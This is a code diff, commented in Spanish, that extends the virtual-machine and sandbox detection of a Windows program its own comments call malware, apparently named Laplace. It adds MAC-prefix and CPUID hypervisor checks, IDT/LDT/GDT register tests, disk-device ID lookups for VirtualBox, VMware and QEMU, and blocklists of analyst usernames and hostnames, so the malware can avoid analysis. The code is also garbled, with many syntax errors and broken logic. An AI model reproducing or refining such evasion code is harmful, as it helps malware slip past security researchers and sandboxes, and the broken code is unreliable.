@@ -294,7 +294,7 @@ static DWORD WINAPI WAIT_SVTIME(LPVOID lpstart){
 		}
 		Exit(1);
 	}
-static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y modificado por Tolaju para Laplace: https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM
+static BOOL CHECK_SPEC_VM_INFO(){ 
 	
 	int FUNC_EXCEPTION = 0;
 	//OBTENER LAS MAC DE LA VM, SI NO FUERON CAMBIADAS, FUNCIONARÁ
@@ -329,9 +329,12 @@ static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y mo
          goto next_vmware_check1;
      }
      const char* mac_blacklist{"00:05:69", "00:0c:29" , "00:1C:14" , "00:50:56", "08:00:27", 
-        "0a:00:27"}; //ENCRIPTAR DIRECCIONES MAC
+        "0A:00:27"}; //ENCRIPTAR DIRECCIONES MAC
      for(int i = 0; i < sizeof(mac_blacklist) / sizeof(mac_blacklist[0];i++){
-     	if(strcmp(MAC, mac_blacklist[i]) == 0) return TRUE;
+     	if(strcmp(MAC, mac_blacklist[i]) == 0){
+     	    HeapFree(GetProcessHeap(),0,MAC);
+             return TRUE;
+     	    }
      	}
     HeapFree(GetProcessHeap(),0,MAC);
     next_vmware_check1:
@@ -442,6 +445,7 @@ static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y mo
 		}
 	next_vmware_check3:
 	
+	//Tratamos de acceder a los dispositivos virtuales (Algo así como archivos especiales relacionados a una función del entorno)
 	const char* dispositivos = {"\\\\.\\vmci", "\\\\.\\HGFS"};
 	
 	int dlen = sizeof(dispositivos) / sizeof(dispositivos[0]);
@@ -456,7 +460,25 @@ static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y mo
 	
 	//Control de excepciones SEH (Excepiones a nivel de sistema operativo, no de C++ en si);
 	//NOTA: Aún no está confirmado que este código pueda ejecutarse en user mode, ya que hay varias posibles razones para que no pueda, pero lo dejaré de momento.
-	
+	bool hyper = false;
+ 
+ __asm {
+ xor    eax, eax
+ mov    eax,0x40000000
+ cpuid
+ cmp ecx,0x4D566572
+ jne NopInstr
+ cmp edx,0x65726177
+ jne NopInstr
+ mov hyper, 0x1
+ NopInstr:
+ nop
+ }
+ 
+  // CPUID: Comparación con la cadena de proveedor. Esta cadena casi siempre es 0x40000000. Detectar el hypervisor (monitor de una máquina virtual)
+
+
+    if(hyper) return TRUE;
 	#ifndef _WIN64
     __try{
 		_asm push ebx
@@ -488,7 +510,7 @@ static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y mo
 	
 	VIRTUAL PC usa muchas instrucciones que no están en la ISA para el backdoor, y que siempre trata de controlar. 
 	
-	El código ensamblador tratará de activar un código no especificado en la ISA, y si VPC actúa en consecuencia, no habrá una excepción
+	El código ensamblador tratará de activar un código no especificado en la ISA, y si VPC actúa en consecuencia, no habrá una excepción porque la controlará
 	pero si hay una excepción, normalmente quiere decir que VPC no ha actuado, por lo que no está.
 	
 	
@@ -506,13 +528,15 @@ static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y mo
     "blue" , "hapubws" , "emily" , "analysis"};
     
     for(int uit = 0; uit < sizeof(blacklisted_names) / sizeof(blacklisted_names[0]); uit++){
-    	if(strcmp((tolower(username)), blacklisted_names[uit]) == 0){
+    	if(strcmp(tolower(username), blacklisted_names[uit]) == 0){
     	    return TRUE;
+        else if(strstr(tolower(username), blacklisted_names[uit] != NULL) return TRUE;
+        else continue;
     	    }
     	}
     
     char *hostname = (char *)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, ((MAX_COMPUTERNAME_LENGHT) * 4)+1);
-    if(CHECK_ALLOC_ERROR(0,0,TRUE,hostname){
+    if(CHECK_ALLOC_ERROR(0,0,TRUE,hostname)){
     	FUNC_EXCEPTION++;
         HeapFree(GetCurrentHeap(), 0, hostname);
         goto blacklisted_check1;
@@ -543,16 +567,26 @@ static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y mo
     
     for(int hit = 0; hit < sizeof(black_host)/sizeof(black_host[0]);hit++){
     	if(strcmp(tolower(hostname), black_host[hit]) != 0){
-    	    if(strcmp(tolower(dns_host), black_host[hit]) != 0) break;
-            else return TRUE;
+    	if(strstr(tolower(hostname), black_host[hit] != NULL) {HeapFree(GetCurrentHeap(), 0, hostname); HeapFree(GetCurrentHeap(), 0, dns_host);return TRUE;}
+    	    if(strcmp(tolower(dns_host), black_host[hit]) != 0) continue;
+            if(strstr(tolower(hostname), black_host[hit] != NULL)  {HeapFree(GetCurrentHeap(), 0, hostname); HeapFree(GetCurrentHeap(), 0, dns_host);return TRUE;}
+            else{
+            	continue;
+                }
     	    }
-        else return TRUE;
+        else{
+        	continue;
+        	}
 	    }
     //Obtención de los nombres asociados al NetBIOS (Protocolo de red local) y de los nombres asociados al DNS local
+   /*
+   En arquitectura de ordenadores, un registro es una memoria de alta velocidad y poca capacidad, integrada en el microprocesador, que permite 
+   guardar transitoriamente y acceder a valores muy usados, generalmente en operaciones matemáticas.
+   */
 
     blacklist_check1:
     
-    
+    //Obtener número de núcleos (las máquinas virtuales no suelen superar los 2 núcleos)
     #ifndef _WIN64
 	PULONG num_poc = (PULONG)(__readfsdword(0x30) + 0x64);
 	#else
@@ -563,6 +597,8 @@ static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y mo
     
     if(*num_poc < 2) return TRUE;
     
+    //Mirar en los punteros de tablas del sistema operativo.
+   //Fuente: https://evasions.checkpoint.com/techniques/cpu.html
     
     /*
     leer pointers donde se ubican las IDT (Tabla donde se almacenan vectores de interruptores, usados para responder a excepciones) del sistema operativo, cuyas direcciones se cambian en 
@@ -581,8 +617,113 @@ static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y mo
 #endif
 	idt = *((unsigned long *)&idtr[2]);
 	
-	if((idt) >> 24) == 0xff) return TRUE;
+	if((idt) >> 24) == 0xff) return TRUE; //Direcciones en VM del IDTR. 
     
+    
+    /*
+    LDT es una tabla con datos que definen características de áreas de memoria de los programas, como permisos, tamaño, etc. Algo parecido pasa con el GDT
+    */
+    
+    char ldt[5] = "\xef\xbe\xad\xde";
+    ULONG ldt = 0;
+    
+    #ifndef _WIN64
+    _asm sldt ldtr
+    #endif
+    ldt = *((unsigned long *)&ldtr[0]);
+    if(ldt != 0xdead0000) return TRUE;
+    
+    //Obtener ubicación en memoria de GDT;
+    
+    char gdtr[6];
+    ULONG gdt = 0;
+    
+    #ifndef _WIN64
+    _asm sgdt gdtr
+    #endif
+    
+    gdt = *((unsigned long *)&gdtr[2]);
+    
+    if((gdt >> 24) == 0xff) return TRUE;
+    
+    
+    /*
+    El STR almacena el TR (que registra tareas). Estos administran las tareas en el procesador, similar a como lo haría
+    un sistema operativo. Los TSS es el lugar donde estos procesos guardan su estado, y todos los procesos tienen una TSS
+    cada una. Usaremos instrucciones STR, que apuntan a estos TSS, cuyas direcciones cambian en un sistema emulado.
+    */
+    
+    
+    HDEVINFO dev_info;
+    
+    SP_DEVINFO_DATA device_data;
+    
+    DWORD d_sz, datatype;
+    dev_info = SetupDiGetClassDevs( //Devuelve información del conjunto de dispositivos especificado
+    (LPGUID)&GUID_DEVCLASS_DISKDRIVE, //Clase de los Device setup del disco duro.
+    0, 0, //GUID de una clase Plug and Play (dispositivo que no necesita ser configurado por software o cualquier cosa) y el tercer parámetro es sobre GUIs
+    DIGCF_PRESENT); //Devuelve la lista de dispositivos disponibles del conjunto de dispositivos especificado
+    
+    if(CHECK_ALLOC_ERROR(5,5,TRUE, dev_info)){
+    	FUNC_EXCEPTION++;
+        goto blacklist_check2;
+    	}
+    
+   device_data.cbSize = sizeof(SP_DEVINFO_DATA);
+    
+    PBYTE device_buffer = NULL;
+    wBOOL setup  = FALSE;
+    for(int di = 0; SetupDiEnumDeviceInfo(dev_info, di, &device_data); di++){ //Devuelve un dispositivo especificado (por el iterador) de la clase especificada en dev_info
+    	while(!setup){
+    	    setup = SetupDiGetDeviceRegistryProperty( //Recupera propiedades P&P ( un disco duro externo es P&P)
+           &dev_info, //El identificador de un conjunto de dispositivos recuperado por SetupDiGetClassDevs
+           &device_data, //Elemento obtenido por SetupDiEnumDeviceInfo
+           SPDRP_HARDWAREID, //Recuperamos el ID del hardware para el dispositivo (Disco Duro)
+           &datatype, device_buffer, // recibimos las propiedades que se devuelven
+           d_sz, &d_sz)); //Tamaño del buffer
+            if(GetLastError() == ERROR_INSUFFICIENT_BUFFER){ //Si ocurre un buffer overflow
+            	if(device_buffer != NULL) HeapFree(GetCurrentHeap(), 0, device_buffer);
+                device_buffer = (PBYTE)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, d_sz * 2); //Multiplicando el valor será suficiente
+                if(CHECK_ALLOC_ERROR(4,4,TRUE, device_buffer)){
+                	FUNC_EXCEPTION++;
+                    goto blacklist_check2;
+                	}
+                else break;
+            	}
+            const char *black_vmdevices[] = {"vbox" , "vmware" , "qemu" , "virtual"};
+            for(int vbi = 0; vbi < sizeof(black_vmdevices) / sizeof(black_vmdevices[0]);vbi++){
+            	if(strcmp(device_buffer, black_vmdevices[vbi]) == 0){ //Si hay un dispositivo blacklisted,  estaremos en una máquina virtual
+            	    HeapFree(GetCurrentHeap(), 0, device_buffer);
+                    return TRUE;
+                	}
+            	}
+    	    }
+    	}
+    /*
+    Clase de Device Setup: Los dispositivos que se instalan y configuran de una forma muy similar, se agrupan en una misma clase.
+    Hay un GUID (Implementación de Microsoft estandarizado para distinguir conjuntos de dispositivos) asociado por cada clase
+    */
+    
+    
+    blacklist_check2:
+    
+    //Retornar características de la CPU, cuyos valores son diferentes en VM
+    bool cpuid = false;
+ __asm {
+ xor    eax, eax
+ inc    eax
+ cpuid
+ bt     ecx, 0x1f
+ jc     UnderVM
+ NotUnderVM:
+ jmp     NopInstr
+ UnderVM:
+ mov    cpuid 0x1
+ NopInstr:
+ nop
+ }
+ if(cpuid) return TRUE;
+ 
     
 	if(FUNC_EXCEPTION != 0) Exit(1); //Explicación: Esta variable registra los fallos cometidos en las funciones, y salta al siguiente módulo para hacer que el malware sea lo más estable
                                                                //posible. Pero claro, si luego resulta que han dado negativo las pruebas, y nos hemos saltado módulos, pues no podremos asegurarnos de que haya VM o no, por lo que provocará una excepción;
@@ -610,6 +751,9 @@ BOOL CHECK_ALLOC_ERROR(int arg, short DATA_TYPE_ID, BOOL RETURN, ...){
 		    break;
 		case 4: ;
 		    lista.add((void *)va_arg(vl, PBYTE);
+		    break;
+		case 5: ;
+		    lista.add((void *)va_arg(vl, HDEVINFO);
 		    break;
 		    }
 		
@@ -640,12 +784,15 @@ BOOL CHECK_ALLOC_ERROR(int arg, short DATA_TYPE_ID, BOOL RETURN, ...){
 		        else return TRUE;
 			    }
 		case 4: ;
-		    if(PBYTE)lista[DATA_TYPE_ID] == NULL){
+		    if((PBYTE)lista[DATA_TYPE_ID] == NULL){
 			    HeapFree(GetProcessHeap(), 0, (PBYTE)lista[DATA_TYPE_ID]);
 			    if(!RETURN)Exit(1);
 		        else return TRUE;
-			    }
-			}
+		    }
+	    case 5: ;
+	        if((HDEVINFO)lista[DATA_TYPE_ID] == INVALID_HANDLE_ VALUE){
+		        return TRUE;
+		    }
 		}
 	return FALSE;
 	}
